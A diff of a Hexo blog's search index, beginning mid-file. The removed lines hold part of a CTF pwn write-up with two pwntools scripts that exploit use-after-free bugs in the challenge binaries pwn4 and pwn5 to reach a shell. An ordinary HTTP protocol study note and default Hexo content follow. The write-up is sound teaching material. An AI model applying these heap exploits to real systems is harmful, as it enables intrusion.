-<p>然后我们选择show，就会调用这个指针，所以我们可以控制这个指针调用我们想要的函数</p>
-<p><img src="/2021/03/30/cumtctf/clip_image020.jpg" alt="img"></p>
-<p>程序中有后门函数，所以只要覆盖成这个就行</p>
-<p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p>
-<p>Payload脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure>
-<h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1>
-<p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p>
-<p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p>
-<p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p>
-<p>所以解题思路是覆盖这个位置的数据为1953330531</p>
-<p>我们注意到删除账号的时候也只是进行了free，没有置空指针，有uaf漏洞利用</p>
-<p><img src="/2021/03/30/cumtctf/clip_image028.jpg" alt="img"></p>
-<p>然后在add memory时，可以读入256个字节。</p>
-<p>Gdb调试：</p>
-<p>先创建一个aaaa，bbbb的账号，堆内存如下</p>
-<p><img src="/2021/03/30/cumtctf/clip_image030.jpg" alt="img"></p>
-<p>然后尝试check，发现检查的main_account+16的位置是0x603010+0x40，也就是64个字节</p>
-<p><img src="/2021/03/30/cumtctf/clip_image032.jpg" alt="img"></p>
-<p>然后删除账号，添加一个memory，内容为68个c</p>
-<p><img src="/2021/03/30/cumtctf/clip_image034.jpg" alt="img"></p>
-<p>就可以覆盖到0x50的位置</p>
-<p>所以只要把0x50位置的值覆盖为1953330531（十六进制0x746d7563）即可</p>
-<p>Payload如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>\<span class="hljs-comment">#p = process(&#x27;./pwn5&#x27;)</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10004</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your first name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your last name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_memory</span>(<span class="hljs-params">payload</span>):</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;plz input what you want say:&quot;</span>)<br><br>  \<span class="hljs-comment">#gdb.attach(p)</span><br><br>  p.sendline(payload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_CUMT</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>Create_your_account()<br><br>delete_your_account()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+p64(<span class="hljs-number">0x746d7563</span>) <br><br>add_memory(payload)<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>check_CUMT()<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> PWN学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTTP协议学习</title>
+      <link href="2021/03/26/http/"/>
+      <url>2021/03/26/http/</url>
+      
+        <content type="html"><![CDATA[<h1 id="http协议学习"><a class="markdownIt-Anchor" href="#http协议学习"></a> HTTP协议学习</h1><h2 id="http和https的区别"><a class="markdownIt-Anchor" href="#http和https的区别"></a> http和https的区别：</h2><ol><li>HTTP 的URL 以http:// 开头，而HTTPS 的URL 以https:// 开头</li><li>HTTP 是不安全的，而 HTTPS 是安全的</li><li>HTTP 标准端口是80 ，而 HTTPS 的标准端口是443</li><li>在OSI 网络模型中，HTTP工作于应用层，而HTTPS 的安全传输机制工作在传输层</li><li>HTTP 无法加密，而HTTPS 对传输的数据进行加密</li><li>HTTP无需证书，而HTTPS 需要CA机构wosign的颁发的SSL证书</li></ol><h2 id="http为什么是无状态协议如何解决"><a class="markdownIt-Anchor" href="#http为什么是无状态协议如何解决"></a> http为什么是无状态协议？如何解决？</h2><p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理</p><p><strong>解决：</strong></p><ul><li>基于Session实现的会话保持<br>在会话开始时（客户端第一次像服务器发送http请求），服务器将会话状态保存起来（本机内存或数据库中），然后分配一个会话标识（SessionId）给客户端，这个会话标识一般保存在客户端Cookie中，以后每次浏览器发送http请求都会带上Cookie中的SessionId到服务器，服务器拿到会话标识就可以把之前存储在服务器端的状态信息与会话联系起来，实现会话保持（如果遇到浏览器禁用Cookie的情况，则可以通过url重写的方式将会话标识放在url的参数里，也可实现会话保持）</li><li>基于Cookie实现的会话保持<br>基于Cookie实现会话保持与上述基于Session实现会话保持的最主要区别是前者完全将会话状态信息存储在浏览器Cookie中，这样一来每次浏览器发送HTTP请求的时候都会带上状态信息，因此也就可以实现状态保持。</li></ul><h2 id="http常用的方法"><a class="markdownIt-Anchor" href="#http常用的方法"></a> http常用的方法</h2><ul><li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器</li><li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li><li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li><li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li><li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li><li>OPTIONS：查询相应URI支持的HTTP方法。</li></ul><h2 id="http请求报文与响应报文格式"><a class="markdownIt-Anchor" href="#http请求报文与响应报文格式"></a> HTTP请求报文与响应报文格式</h2><p>请求报文包含四部分：</p><p><img src="/2021/03/26/http/1.png" alt="1"></p><ul><li>a、请求行：包含请求方法、URI、HTTP版本信息</li><li>b、请求首部字段</li><li>c、请求内容实体</li><li>d、空行</li></ul><p>响应报文包含四部分：</p><p><img src="/2021/03/26/http/2.png" alt="2"></p><p>常见的首部：</p><ul><li><strong>通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><ul><li>Date：创建报文时间</li><li>Connection：连接的管理</li><li>Cache-Control：缓存的控制</li><li>Transfer-Encoding：报文主体的传输编码方式</li></ul></li><li><strong>请求首部字段（请求报文会使用的首部字段）</strong><ul><li>Host：请求资源所在服务器</li><li>Accept：可处理的媒体类型</li><li>Accept-Charset：可接收的字符集</li><li>Accept-Encoding：可接受的内容编码</li><li>Accept-Language：可接受的自然语言</li></ul></li><li><strong>响应首部字段（响应报文会使用的首部字段）</strong><ul><li>Accept-Ranges：可接受的字节范围</li><li>Location：令客户端重新定向到的URI</li><li>Server：HTTP服务器的安装信息</li></ul></li><li><strong>实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</strong><ul><li>Allow：资源可支持的HTTP方法</li><li>Content-Type：实体主类的类型</li><li>Content-Encoding：实体主体适用的编码方式</li><li>Content-Language：实体主体的自然语言</li><li>Content-Length：实体主体的的字节数</li><li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li></ul></li></ul><h2 id="https工作原理"><a class="markdownIt-Anchor" href="#https工作原理"></a> HTTPS工作原理</h2><ul><li>一、首先HTTP请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（RSA加密）等进行校验；</li><li>二、客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（RSA加密）；</li><li>三、消息体产生的后，对它的摘要进行MD5（或者SHA1）算法加密，此时就得到了RSA签名；</li><li>四、发送给服务端，此时只有服务端（RSA私钥）能解密。</li><li>五、解密得到的随机数，再用AES加密，作为密钥（此时的密钥只有客户端和服务端知道）。</li></ul><h2 id="一次完整的http请求"><a class="markdownIt-Anchor" href="#一次完整的http请求"></a> 一次完整的HTTP请求</h2><p>HTTP通信机制是在一次完整的HTTP通信过程中，Web浏览器与Web服务器之间将完成下列7个步骤：</p><ul><li>建立TCP连接</li></ul><p>在HTTP工作开始之前，Web浏览器首先要通过网络与Web服务器建立连接，该连接是通过TCP来完成的，该协议与IP协议共同构建 Internet，即著名的TCP/IP协议族，因此Internet又被称作是TCP/IP网络。<strong>HTTP是比TCP更高层次的应用层协议，根据规则， 只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。</strong></p><ul><li>Web浏览器向Web服务器发送请求行</li></ul><p>一旦建立了TCP连接，<strong>Web浏览器就会向Web服务器发送请求命令</strong>。例如：GET /sample/hello.jsp HTTP/1.1。</p><ul><li>Web浏览器发送请求头<ul><li>浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，<strong>之后浏览器发送了一空白行来通知服务器</strong>，它已经结束了该头信息的发送。</li></ul></li><li>Web服务器应答<ul><li>客户机向服务器发出请求后，服务器会客户机回送应答， <strong>HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。</strong></li></ul></li><li>Web服务器发送应答头<ul><li>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。</li></ul></li><li>Web服务器向浏览器发送数据<ul><li>Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，<strong>它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据</strong>。</li></ul></li><li>Web服务器关闭TCP连接<ul><li>一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码：</li></ul></li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Connection:</span><span class="hljs-meta">keep</span>-alive<br></code></pre></td></tr></table></figure><p>TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p><p><strong>建立TCP连接-&gt;发送请求行-&gt;发送请求头-&gt;（到达服务器）发送状态行-&gt;发送响应头-&gt;发送响应数据-&gt;断TCP连接</strong></p><h2 id="常见的http相应状态码"><a class="markdownIt-Anchor" href="#常见的http相应状态码"></a> 常见的HTTP相应状态码</h2><ul><li>200：请求被正常处理</li><li>204：请求被受理但没有资源可以返回</li><li>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。</li><li>301：永久性重定向</li><li>302：临时重定向</li><li>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上</li><li>304：发送附带条件的请求时，条件不满足时返回，与重定向无关</li><li>307：临时重定向，与302类似，只是强制要求使用POST方法</li><li>400：请求报文语法有误，服务器无法识别</li><li>401：请求需要认证</li><li>403：请求的对应资源禁止被访问</li><li>404：服务器无法找到对应资源</li><li>500：服务器内部错误</li><li>503：服务器正忙</li></ul><h2 id="http11版本新特性"><a class="markdownIt-Anchor" href="#http11版本新特性"></a> HTTP1.1版本新特性</h2><ul><li>a、<strong>默认持久连接节省通信量</strong>，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</li><li>b、<strong>管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</strong></li><li>c、<strong>断点续传</strong><ul><li><strong>实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输。</strong></li></ul></li></ul><h2 id="http优化方案"><a class="markdownIt-Anchor" href="#http优化方案"></a> HTTP优化方案</h2><ul><li><strong>TCP复用：TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</strong></li><li><strong>内容缓存：将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</strong></li><li><strong>压缩：将文本数据进行压缩，减少带宽</strong></li><li><strong>SSL加速（SSL Acceleration）：使用SSL协议对HTTP协议进行加密，在通道内加密并加速</strong></li><li><strong>TCP缓冲：通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担。</strong></li></ul><blockquote><p><em><strong>参考文章：<a href="https://blog.csdn.net/yicixing7/article/details/79320821">https://blog.csdn.net/yicixing7/article/details/79320821</a></strong></em></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>PWN学习</category>
-        <category>学习</category>
+          
+          <category> 学习 </category>
+          
       </categories>
-      <tags>
-        <tag>PWN学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/03/24/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
-<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>HTTP协议学习</title>
-    <url>/2021/03/26/http/</url>
-    <content><![CDATA[<h1 id="http协议学习"><a class="markdownIt-Anchor" href="#http协议学习"></a> HTTP协议学习</h1>
-<h2 id="http和https的区别"><a class="markdownIt-Anchor" href="#http和https的区别"></a> http和https的区别：</h2>
-<ol>
-<li>HTTP 的URL 以http:// 开头，而HTTPS 的URL 以https:// 开头</li>
-<li>HTTP 是不安全的，而 HTTPS 是安全的</li>
-<li>HTTP 标准端口是80 ，而 HTTPS 的标准端口是443</li>
-<li>在OSI 网络模型中，HTTP工作于应用层，而HTTPS 的安全传输机制工作在传输层</li>
-<li>HTTP 无法加密，而HTTPS 对传输的数据进行加密</li>
-<li>HTTP无需证书，而HTTPS 需要CA机构wosign的颁发的SSL证书</li>
-</ol>
-<h2 id="http为什么是无状态协议如何解决"><a class="markdownIt-Anchor" href="#http为什么是无状态协议如何解决"></a> http为什么是无状态协议？如何解决？</h2>
-<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理</p>
-<p><strong>解决：</strong></p>
-<ul>
-<li>基于Session实现的会话保持<br>
-在会话开始时（客户端第一次像服务器发送http请求），服务器将会话状态保存起来（本机内存或数据库中），然后分配一个会话标识（SessionId）给客户端，这个会话标识一般保存在客户端Cookie中，以后每次浏览器发送http请求都会带上Cookie中的SessionId到服务器，服务器拿到会话标识就可以把之前存储在服务器端的状态信息与会话联系起来，实现会话保持（如果遇到浏览器禁用Cookie的情况，则可以通过url重写的方式将会话标识放在url的参数里，也可实现会话保持）</li>
-<li>基于Cookie实现的会话保持<br>
-基于Cookie实现会话保持与上述基于Session实现会话保持的最主要区别是前者完全将会话状态信息存储在浏览器Cookie中，这样一来每次浏览器发送HTTP请求的时候都会带上状态信息，因此也就可以实现状态保持。</li>
-</ul>
-<h2 id="http常用的方法"><a class="markdownIt-Anchor" href="#http常用的方法"></a> http常用的方法</h2>
-<ul>
-<li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器</li>
-<li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li>
-<li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li>
-<li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li>
-<li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li>
-<li>OPTIONS：查询相应URI支持的HTTP方法。</li>
-</ul>
-<h2 id="http请求报文与响应报文格式"><a class="markdownIt-Anchor" href="#http请求报文与响应报文格式"></a> HTTP请求报文与响应报文格式</h2>
-<p>请求报文包含四部分：</p>
-<p><img src="/2021/03/26/http/1.png" alt="1"></p>
-<ul>
-<li>a、请求行：包含请求方法、URI、HTTP版本信息</li>
-<li>b、请求首部字段</li>
-<li>c、请求内容实体</li>
-<li>d、空行</li>
-</ul>
-<p>响应报文包含四部分：</p>
-<p><img src="/2021/03/26/http/2.png" alt="2"></p>
-<p>常见的首部：</p>
-<ul>
-<li><strong>通用首部字段（请求报文与响应报文都会使用的首部字段）</strong>
-<ul>
-<li>Date：创建报文时间</li>
-<li>Connection：连接的管理</li>
-<li>Cache-Control：缓存的控制</li>
-<li>Transfer-Encoding：报文主体的传输编码方式</li>
-</ul>
-</li>
-<li><strong>请求首部字段（请求报文会使用的首部字段）</strong>
-<ul>
-<li>Host：请求资源所在服务器</li>
-<li>Accept：可处理的媒体类型</li>
-<li>Accept-Charset：可接收的字符集</li>
-<li>Accept-Encoding：可接受的内容编码</li>
-<li>Accept-Language：可接受的自然语言</li>
-</ul>
-</li>
-<li><strong>响应首部字段（响应报文会使用的首部字段）</strong>
-<ul>
-<li>Accept-Ranges：可接受的字节范围</li>
-<li>Location：令客户端重新定向到的URI</li>
-<li>Server：HTTP服务器的安装信息</li>
-</ul>
-</li>
-<li><strong>实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</strong>
-<ul>
-<li>Allow：资源可支持的HTTP方法</li>
-<li>Content-Type：实体主类的类型</li>
-<li>Content-Encoding：实体主体适用的编码方式</li>
-<li>Content-Language：实体主体的自然语言</li>
-<li>Content-Length：实体主体的的字节数</li>
-<li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li>
-</ul>
-</li>
-</ul>
-<h2 id="https工作原理"><a class="markdownIt-Anchor" href="#https工作原理"></a> HTTPS工作原理</h2>
-<ul>
-<li>一、首先HTTP请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（RSA加密）等进行校验；</li>
-<li>二、客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（RSA加密）；</li>
-<li>三、消息体产生的后，对它的摘要进行MD5（或者SHA1）算法加密，此时就得到了RSA签名；</li>
-<li>四、发送给服务端，此时只有服务端（RSA私钥）能解密。</li>
-<li>五、解密得到的随机数，再用AES加密，作为密钥（此时的密钥只有客户端和服务端知道）。</li>
-</ul>
-<h2 id="一次完整的http请求"><a class="markdownIt-Anchor" href="#一次完整的http请求"></a> 一次完整的HTTP请求</h2>
-<p>HTTP通信机制是在一次完整的HTTP通信过程中，Web浏览器与Web服务器之间将完成下列7个步骤：</p>
-<ul>
-<li>建立TCP连接</li>
-</ul>
-<p>在HTTP工作开始之前，Web浏览器首先要通过网络与Web服务器建立连接，该连接是通过TCP来完成的，该协议与IP协议共同构建 Internet，即著名的TCP/IP协议族，因此Internet又被称作是TCP/IP网络。<strong>HTTP是比TCP更高层次的应用层协议，根据规则， 只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。</strong></p>
-<ul>
-<li>Web浏览器向Web服务器发送请求行</li>
-</ul>
-<p>一旦建立了TCP连接，<strong>Web浏览器就会向Web服务器发送请求命令</strong>。例如：GET /sample/hello.jsp HTTP/1.1。</p>
-<ul>
-<li>Web浏览器发送请求头
-<ul>
-<li>浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，<strong>之后浏览器发送了一空白行来通知服务器</strong>，它已经结束了该头信息的发送。</li>
-</ul>
-</li>
-<li>Web服务器应答
-<ul>
-<li>客户机向服务器发出请求后，服务器会客户机回送应答， <strong>HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。</strong></li>
-</ul>
-</li>
-<li>Web服务器发送应答头
-<ul>
-<li>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。</li>
-</ul>
-</li>
-<li>Web服务器向浏览器发送数据
-<ul>
-<li>Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，<strong>它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据</strong>。</li>
-</ul>
-</li>
-<li>Web服务器关闭TCP连接
-<ul>
-<li>一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码：</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Connection:</span><span class="hljs-meta">keep</span>-alive<br></code></pre></td></tr></table></figure>
-<p>TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p>
-<p><strong>建立TCP连接-&gt;发送请求行-&gt;发送请求头-&gt;（到达服务器）发送状态行-&gt;发送响应头-&gt;发送响应数据-&gt;断TCP连接</strong></p>
-<h2 id="常见的http相应状态码"><a class="markdownIt-Anchor" href="#常见的http相应状态码"></a> 常见的HTTP相应状态码</h2>
-<ul>
-<li>200：请求被正常处理</li>
-<li>204：请求被受理但没有资源可以返回</li>
-<li>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。</li>
-<li>301：永久性重定向</li>
-<li>302：临时重定向</li>
-<li>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上</li>
-<li>304：发送附带条件的请求时，条件不满足时返回，与重定向无关</li>
-<li>307：临时重定向，与302类似，只是强制要求使用POST方法</li>
-<li>400：请求报文语法有误，服务器无法识别</li>
-<li>401：请求需要认证</li>
-<li>403：请求的对应资源禁止被访问</li>
-<li>404：服务器无法找到对应资源</li>
-<li>500：服务器内部错误</li>
-<li>503：服务器正忙</li>
-</ul>
-<h2 id="http11版本新特性"><a class="markdownIt-Anchor" href="#http11版本新特性"></a> HTTP1.1版本新特性</h2>
-<ul>
-<li>a、<strong>默认持久连接节省通信量</strong>，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</li>
-<li>b、<strong>管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</strong></li>
-<li>c、<strong>断点续传</strong>
-<ul>
-<li><strong>实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输。</strong></li>
-</ul>
-</li>
-</ul>
-<h2 id="http优化方案"><a class="markdownIt-Anchor" href="#http优化方案"></a> HTTP优化方案</h2>
-<ul>
-<li><strong>TCP复用：TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</strong></li>
-<li><strong>内容缓存：将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</strong></li>
-<li><strong>压缩：将文本数据进行压缩，减少带宽</strong></li>
-<li><strong>SSL加速（SSL Acceleration）：使用SSL协议对HTTP协议进行加密，在通道内加密并加速</strong></li>
-<li><strong>TCP缓冲：通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担。</strong></li>
-</ul>
-<blockquote>
-<p><em><strong>参考文章：<a href="https://blog.csdn.net/yicixing7/article/details/79320821">https://blog.csdn.net/yicixing7/article/details/79320821</a></strong></em></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> web学习 </tag>
+            
+            <tag> http </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo启用搜索功能(图片测试)</title>
+      <link href="2021/03/25/phtest/"/>
+      <url>2021/03/25/phtest/</url>
+      
